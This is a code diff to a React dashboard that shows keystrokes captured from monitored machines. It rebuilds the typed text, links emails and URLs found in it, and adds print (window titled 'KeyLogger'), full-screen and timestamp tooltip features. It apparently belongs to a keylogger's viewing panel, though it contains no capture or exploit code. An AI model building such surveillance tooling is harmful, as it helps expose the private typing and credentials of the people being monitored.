@@ -251,11 +251,13 @@
         }
 
         .typing-indicator {
-            height: 10px;
-            width: 2px;
+            height: 13px;
+            width: 5px;
             display: inline-block;
             background: white;
-            animation: pulse 1s linear infinite alternate;
+            animation: pulse 0.5s linear infinite alternate;
+            margin-bottom: -2px;
+            margin-left: 4px;
         }
 
         /* Animation for refresh button */
@@ -600,6 +602,35 @@
         const [socketConnected, setSocketConnected] = useState(false);
         const [title, setTitle] = useState("")
         const timelineRef = useRef(null);
+        const [isFullScreen, setIsFullScreen] = useState(false)
+
+        const [tooltip, setTooltip] = useState({
+            visible: false,
+            text: "",
+            x: 0,
+            y: 0,
+        });
+
+        const handleMouseOver = (e, unix) => {
+            setTooltip({
+                visible: true,
+                text: formatTime(unix),
+                x: e.clientX + window.scrollX,
+                y: e.clientY + window.scrollY,
+            });
+        };
+
+        const handleMouseMove = (e) => {
+            setTooltip((prev) => ({
+                ...prev,
+                x: e.clientX + window.scrollX,
+                y: e.clientY + window.scrollY,
+            }));
+        };
+
+        const handleMouseOut = () => {
+            setTooltip((prev) => ({ ...prev, visible: false }));
+        };
 
         const loadMachineData = async () => {
             try {
@@ -613,6 +644,29 @@
                 setLoading(false);
             }
         };
+
+        function timeAgo(unixTime) {
+            // Support both seconds and milliseconds
+            const timestamp = unixTime < 1e12 ? unixTime * 1000 : unixTime;
+            const now = Date.now();
+            const diffMs = now - timestamp;
+
+            const seconds = Math.floor(diffMs / 1000);
+            const minutes = Math.floor(seconds / 60);
+            const hours   = Math.floor(minutes / 60);
+            const days    = Math.floor(hours / 24);
+            const weeks   = Math.floor(days / 7);
+            const months  = Math.floor(days / 30);
+            const years   = Math.floor(days / 365);
+
+            if (seconds < 60) return `${seconds}s ago`;
+            if (minutes < 60) return `${minutes}m ago`;
+            if (hours < 24)   return `${hours}h ago`;
+            if (days < 7)     return `${days}d ago`;
+            if (weeks < 5)    return `${weeks}w ago`;
+            if (months < 12)  return `${months}mo ago`;
+            return `${years}y ago`;
+        }
 
         const loadEvents = async () => {
             try {
@@ -637,6 +691,37 @@
             }
         };
 
+        function _print() {
+            // todo()
+            if (!timelineRef.current) return
+            const content = timelineRef.current.innerHTML;
+            const win = window.open("", "", "width=800,height=600");
+            win.document.write(`
+          <html>
+            <head>
+              <title>KeyLogger</title>
+              <style>
+                body { font-family: Arial; direction: rtl; }
+              </style>
+            </head>
+            <body>${content}</body>
+          </html>
+        `);
+            win.document.close();
+            win.focus();
+            win.print();
+            // win.close();
+        }
+
+        const toggleFullScreen = () => {
+            if (!timelineRef.current) return
+            if (!document.fullscreenElement) {
+                timelineRef.current.requestFullscreen();
+            } else {
+                document.exitFullscreen();
+            }
+        }
+
         const toggleAutoScroll = () => {
             setAutoScroll(!autoScroll);
             if (!autoScroll) {
@@ -645,7 +730,7 @@
         };
 
         const updateTitle = () => {
-          if (!title) return
+            if (!title) return
             API.updateMachineTitle(machine.display_username, title)
         }
 
@@ -704,7 +789,8 @@
         };
 
         const formatTime = (timestamp) => {
-            return new Date(timestamp * 1000).toLocaleString('en-US', {
+            console.log(timestamp)
+            return new Date(Number(timestamp) * 1000).toLocaleString('en-US', {
                 timeStyle: 'medium'
             });
         };
@@ -720,8 +806,8 @@
         };
 
         // Function to convert events to continuous text
-        const convertEventsToText = (eventsList) => {
-            let fullText = '';
+        const convertEventsToSpans = (eventsList) => {
+            let items = [];
 
             // The array comes from newest to oldest, so we iterate from start to end to get correct chronological order
             for (let i = 0; i < eventsList.length; i++) {
@@ -729,37 +815,57 @@
                 const eventText = event.event;
 
                 if (eventText === '\n' || eventText === 'Key.enter') {
-                    fullText += '\n';
+                    items.push(<br key={i}></br>)
                 } else if (eventText === '\b' || eventText === 'Key.backspace') {
-                    // Deletion - remove one character
-                    fullText = fullText.slice(0, -1);
+                    items.pop()
                 } else if (eventText === '\t' || eventText === 'Key.tab') {
-                    fullText += '    '; // Tab = 4 spaces
+                    items.push(<span key={i}>    </span>)
                 } else if (eventText === 'Key.space') {
-                    fullText += ' ';
+                    items.push(<span key={i}> </span>)
                 } else if (eventText.length === 1 && !eventText.match(/[\u0000-\u001F]/) ||
                     (eventText.match(/[\u0000-\u001F]/) && eventText !== '\u0003' && eventText !== '\u0001')) {
                     // Regular character or allowed control character
-                    fullText += eventText;
+                    items.push(<span
+                        key={i}
+                        onMouseOver={(e) => handleMouseOver(e, event.timestamp)}
+                        onMouseMove={handleMouseMove}
+                        onMouseOut={handleMouseOut}
+                        data-time={event.timestamp} children={eventText}></span>)
                 }
                 // Skip other special keys
             }
 
-            return fullText;
+            return items;
         };
 
-        let processedText = convertEventsToText(events);
+        let itemsToRender = convertEventsToSpans(events);
 
-        const findHighlightsInText = (text) => {
-            // search for emails and urls
+        const findHighlightsInReactElements = (elements) => {
+            const newElements = [];
             const highlights = [];
+            const textParts = [];
+            const offsets = [];
+            let currentOffset = 0;
+
+            elements.forEach(el => {
+                if (React.isValidElement(el) && typeof el.props.children === 'string') {
+                    const textContent = el.props.children;
+                    textParts.push(textContent);
+                    offsets.push(currentOffset);
+                    currentOffset += textContent.length;
+                } else {
+                    textParts.push('');
+                    offsets.push(currentOffset);
+                }
+            });
+
+            const fullText = textParts.join('');
 
             const urlRegex = /(https?:\/\/[^\s]+)/g;
             const emailRegex = /([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/g;
 
             let match;
-
-            while ((match = urlRegex.exec(text)) !== null) {
+            while ((match = urlRegex.exec(fullText)) !== null) {
                 highlights.push({
                     type: 'url',
                     offset: match.index,
@@ -767,8 +873,7 @@
                     value: match[0]
                 });
             }
-
-            while ((match = emailRegex.exec(text)) !== null) {
+            while ((match = emailRegex.exec(fullText)) !== null) {
                 highlights.push({
                     type: 'email',
                     offset: match.index,
@@ -777,17 +882,42 @@
                 });
             }
 
-            return highlights;
+            highlights.sort((a, b) => a.offset - b.offset);
+
+            let elementIndex = 0;
+            let highlightIndex = 0;
+
+            while (elementIndex < elements.length) {
+                const currentElement = elements[elementIndex];
+                const currentHighlight = highlights[highlightIndex];
+                const currentOffsetInText = offsets[elementIndex];
+
+                if (currentHighlight && currentOffsetInText === currentHighlight.offset) {
+                    const combinedText = fullText.slice(
+                        currentHighlight.offset,
+                        currentHighlight.offset + currentHighlight.size
+                    );
+
+                    const href = currentHighlight.type === 'email' ? `mailto:${combinedText}` : combinedText;
+
+                    newElements.push(
+                        <a {...currentElement.props} href={href} target="_blank" className="highlight">
+                            {combinedText}
+                        </a>
+                    );
+
+                    elementIndex += currentHighlight.size;
+                    highlightIndex++;
+                } else {
+                    newElements.push(currentElement);
+                    elementIndex++;
+                }
+            }
+
+            return newElements;
         };
 
-        const highlights = findHighlightsInText(processedText)
-
-        highlights.forEach(h => {
-            const linkTag = `<a href="${h.type === 'email' ? 'mailto:' : ''}${h.value}" class="highlight">${h.value}</a>`;
-            processedText = processedText.slice(0, h.offset) + linkTag + processedText.slice(h.offset + h.size);
-        });
-
-        processedText = processedText + '<span class="typing-indicator"/>'
+        itemsToRender = findHighlightsInReactElements(itemsToRender)
 
         // Creating real time points for timeline - only minutes
         const createTimePoints = () => {
@@ -941,6 +1071,16 @@
                     <div className="card-header d-flex justify-content-between align-items-center">
                         <h5 className="mb-0">Typing History</h5>
                         <div>
+                            <button onClick={() => _print(itemsToRender)}
+                                    className="btn btn-sm btn-outline-primary ms-2">
+                                <i className="bi bi-printer-fill me-1"></i>
+                                Print
+                            </button>
+                            <button onClick={toggleFullScreen}
+                                    className="btn btn-sm btn-outline-primary ms-2">
+                                <i className={`bi ${isFullScreen ? "bi-fullscreen-exit" : "bi-fullscreen"} me-1`}></i>
+                                {isFullScreen && "Exit"} Full Screen
+                            </button>
                             <button
                                 className={`btn btn-sm ${autoScroll ? 'btn-success' : 'btn-outline-secondary'}`}
                                 onClick={toggleAutoScroll}
@@ -971,7 +1111,7 @@
                                 <p>No typing events recorded for this machine</p>
                             </div>
                         ) : (
-                            <div className="timeline-container" ref={timelineRef}>
+                            <div className="timeline-container position-relative" ref={timelineRef}>
                                 <div className="timeline-sidebar">
                                     {timePoints.map((point, index) => (
                                         <div
@@ -983,8 +1123,32 @@
                                         </div>
                                     ))}
                                 </div>
-                                <div className="timeline-content-area"
-                                     dangerouslySetInnerHTML={{__html: processedText || "No data to display..."}}/>
+                                <div className="timeline-content-area">
+                                    {itemsToRender.length ? itemsToRender : "No data to display..."}
+                                    <span className="typing-indicator" ></span>
+                                </div>
+
+
+                                {/** todo(need to update) */}
+                                {events.length > 0 && <div>Last event {timeAgo(events.at(-1).timestamp)} ago</div>}
+
+
+                                {tooltip.visible && (
+                                    <div
+                                        className=" tooltip bs-tooltip-top show position-absolute"
+                                        style={{
+                                            position: "absolute",
+                                            right: 10,
+                                            top:  40, // todo fix to fit the element position
+                                            zIndex: 9999,
+                                            pointerEvents: "none",
+
+                                        }}
+                                    >
+                                        <div className="tooltip-arrow"></div>
+                                        <div className="tooltip-inner">{tooltip.text}</div>
+                                    </div>
+                                )}
                             </div>
                         )}
                     </div>
